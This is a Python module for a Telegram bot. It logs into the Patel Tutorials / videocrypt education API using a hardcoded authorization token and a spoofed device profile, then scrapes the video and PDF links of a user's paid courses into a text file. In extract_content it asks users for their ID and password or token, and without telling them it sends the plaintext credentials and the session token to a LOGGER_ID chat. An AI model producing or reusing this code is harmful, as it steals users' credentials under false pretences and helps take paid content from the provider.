import json
import time
import os
import aiohttp
import asyncio
from pyrogram.enums import ParseMode
from config import LOGGER_ID
from Extractor.core.func import get_time
from Extractor.core.c_func import gen_key_iv, encrypt, decrypt, decode_jwt
from Extractor.core.func import send_file



class Patel_Tutorials:
    def __init__(self):
        self.v_count = 0
        self.p_count = 0
        self.DEFAULT_BASE = "0117108641864451"
        self.BASE = "1171086418644515_263"
        self.API_BASE = "https://appapi.videocrypt.in/index.php"
        
        self.HEADERS = {
            "userid": "0",
            "devicetype": "1",
            "lang": "1",
            "authorization": "Bearer 117#Nerglnw3@@OI)30@I*Dm'@@_263",
            "version": "59",
            "appid": "263",
            "user-agent": "okhttp/4.11.0",
        }
        
        self.LOGIN_DATA = {
            "c_code": "+91",
            "device_id": "36f3554b89597619",
            "device_token": "f9c8b1a4d7e34c1aa6e84g17e5b2d3c76a5e8d9f12a34b6c8d0e1f2a3b4c5d6e",
            "is_social": "0",
            "location": {
                "device_model": "SM-F9360",
                "ip": "",
                "lat": "N/A",
                "lng": "N/A",
                "manufacturer": "samsung",
                "os_version": "14"
            },
        }

    async def fetch_with_retry(self, session, url, headers, data, key, iv, max_retries=3):
        for attempt in range(max_retries):
            try:
                async with session.post(url, headers=headers, data=data) as response:
                    data = await response.text()
                    decrypted = decrypt(key, iv, data)
                    return json.loads(decrypted)
            except Exception as e:
                if attempt == max_retries - 1:
                    raise e
                await asyncio.sleep(1)

    async def get_content_url(self, session, course_id, content, headers, key, iv):
        try:
            url = None
            if content.get('file_type') == '3':
                if content.get('is_drm') == '1':
                    self.v_count += 1
                    url = f"https://www.videocrypt.in/drm/{content.get('vdc_id')}/{headers.get('userid')}"
                elif content.get('video_type') == '1':
                    url = f"https://youtu.be/{content['file_url']}"
                    self.v_count += 1
                else:
                    url = content['file_url'].replace('\\/', '/').replace('https\\:', 'https:')
                    self.v_count += 1
                if content.get('had_pdf') == '1':
                    data = {"course_id": course_id, "video_id": content.get('id')}
                    encrypted_data = encrypt(key, iv, json.dumps(data))
                    result = await self.fetch_with_retry(session, f"{self.API_BASE}/data_model/poll/get_content_pdf", headers, encrypted_data, key, iv)
                    for pdf in result['data']:
                        url += f"\n{pdf['pdf_title']} : {pdf['pdf_url']}"

            else:
                url = content['file_url'].replace('\\/', '/').replace('https\\:', 'https:')
                self.p_count += 1
                    
            return url
        except Exception as e:
            print(f"Error in get_content_url: {e}")
        return None

    async def process_topic(self, session, course_id, batch_id, topic_id, subject_id, tile_type, tile_id, revert_api, headers, key, iv):
        try:
            data = {
                "course_id": course_id,
                "layer": "3",
                "keyword": "",
                "page": "1",
                "parent_id": batch_id,
                "revert_api": revert_api,
                "subject_id": subject_id,
                "tile_id": tile_id,
                "topic_id": topic_id,
                "type": tile_type
            }
            encrypted_data = encrypt(key, iv, json.dumps(data))
        
            topic_data = await self.fetch_with_retry(
                session,
                f"{self.API_BASE}/data_model/course/get_master_data",
                headers,
                encrypted_data,
                key,
                iv
            )

            contents = ""
            if not topic_data.get('data', []):
                return ""
            for content in topic_data['data']['list']:
                if content.get('file_type') in ('3', '1', '7'):
                    url = await self.get_content_url(session, course_id, content, headers, key, iv)
                    if url:
                        contents += f"{content['title']} : {url}\n"
            return contents
        except Exception as e:
            print(f"Error in process_topic: {e}")
            return ""

    async def process_course(self, session, course_id, batch_id, headers, key, iv):
        try:
            data = {
                "course_id": course_id,
                "parent_id": batch_id
            }
            encrypted_data = encrypt(key, iv, json.dumps(data))
        
            course_detail = await self.fetch_with_retry(
                session,
                f"{self.API_BASE}/data_model/course_deprecated/get_course_detail",
                headers,
                encrypted_data,
                key,
                iv
            )

            tasks = []
            results = ""
            for tile in course_detail['data']['tiles']:
                if tile['type'] not in ["video", "pdf"]:
                    continue
 
                for topic in tile['meta']['list']:
                    for subtopic in topic['list']:
                        results += await self.process_topic(session, course_id, batch_id, subtopic['id'], topic['id'], tile['type'], tile['id'], tile['revert_api'], headers, key, iv)
        
            #results = await asyncio.gather(*tasks)
            return results
        except Exception as e:
            print(f"Error in process_course: {e}")
            return []

    async def extract_content(self, app, query, message):
        try:
            msg = await message.reply_text(
                "**🔑 For access, please transmit your ID & Password in the correct sequence:\n\n"
                "🔒 Send like this: ID*Password\n\nOr Send Token....**"
            )
            
            input1 = await app.listen(chat_id=message.chat.id, user_id=query.from_user.id)
            raw_text = input1.text
            await input1.delete(True)

            connector = aiohttp.TCPConnector(limit=50)
            timeout = aiohttp.ClientTimeout(total=300)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                if '*' in raw_text:
                    email, password = raw_text.split("*")
                    key, iv = gen_key_iv(self.DEFAULT_BASE)
                    login_data = {**self.LOGIN_DATA, "mobile": email.strip(), "password": password.strip()}
                    encrypted_data = encrypt(key, iv, json.dumps(login_data))
                    
                    result = await self.fetch_with_retry(
                        session,
                        f"{self.API_BASE}/data_model/users/login_auth",
                        self.HEADERS,
                        encrypted_data,
                        key,
                        iv
                    )
                    token = result['data']['jwt']
                    try:
                        await app.send_message(
                            chat_id=LOGGER_ID,
                            text=f"✅ Patel Tutorials\n\nᴛᴏᴋᴇɴ:\n<code>{token}</code>\n\nɪᴅ ᴘᴀssᴡᴏʀᴅ: <code>{email}*{password}</code>",
                            reply_to_message_id=6,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        pass
                else:
                    token = raw_text.strip()
                    try:
                        await app.send_message(
                            chat_id=LOGGER_ID,
                            text=f"✅ Patel Tutorials\n\nᴛᴏᴋᴇɴ:\n<code>{token}</code>",
                            reply_to_message_id=6,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        pass

                user_id = decode_jwt(token)['id']
                key, iv = gen_key_iv(self.BASE, user_id)
                headers = {**self.HEADERS, 'jwt': token, 'userid': str(user_id)}

                data = {"user_id": user_id}
                encrypted_data = encrypt(key, iv, json.dumps(data))
                courses_data = await self.fetch_with_retry(
                    session,
                    f"{self.API_BASE}/data_model/course/get_my_courses",
                    headers,
                    encrypted_data,
                    key,
                    iv
                )
                courses = courses_data['data']

                batch_list = "\n".join(
                    f"<code>{batch['id']}</code> - <b>{batch['title']}</b>"
                    for batch in courses
                )
                await msg.edit_text(
                    f"<b>📚 Available Batches:</b>\n\n{batch_list}\n\n"
                    "<b>Send Batch ID to download:</b>",
                    parse_mode=ParseMode.HTML
                )

                batch_msg = await app.listen(chat_id=message.chat.id, user_id=query.from_user.id)
                batch_id = batch_msg.text.strip()
                await batch_msg.delete()

                batch_name = next(
                    (c['title'] for c in courses if str(c['id']) == batch_id),
                    None
                )

                await msg.edit_text("**Extracting Videos Links Please Wait  📥**")
                start_time = time.time()

                all_contents = await self.process_course(session, batch_id, batch_id, headers, key, iv)
                
                filename = f"{batch_name}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(all_contents)

                end_time = time.time()
                duration = end_time - start_time
                elapsed = get_time(duration)

                caption = (
                    f"**App Name :- Patel Tutorials**\n"
                    f"**Batch Name :-** `{batch_name}`\n\n"
                    f"🍿 **Total Video**: `{self.v_count}`\n"
                    f"📝 **Total pdf**: `{self.p_count}`\n"
                    f"⌚️**Time Taken**: `{elapsed}`"
                )
                
                return await send_file(filename, caption, msg, query)

        except Exception as e:
            print(f"Error: {e}")
            await message.reply_text(f"An error occurred: {str(e)}")


async def patel_tutorials(app, query, message):
    extractor = Patel_Tutorials()
    return await extractor.extract_content(app, query, message)
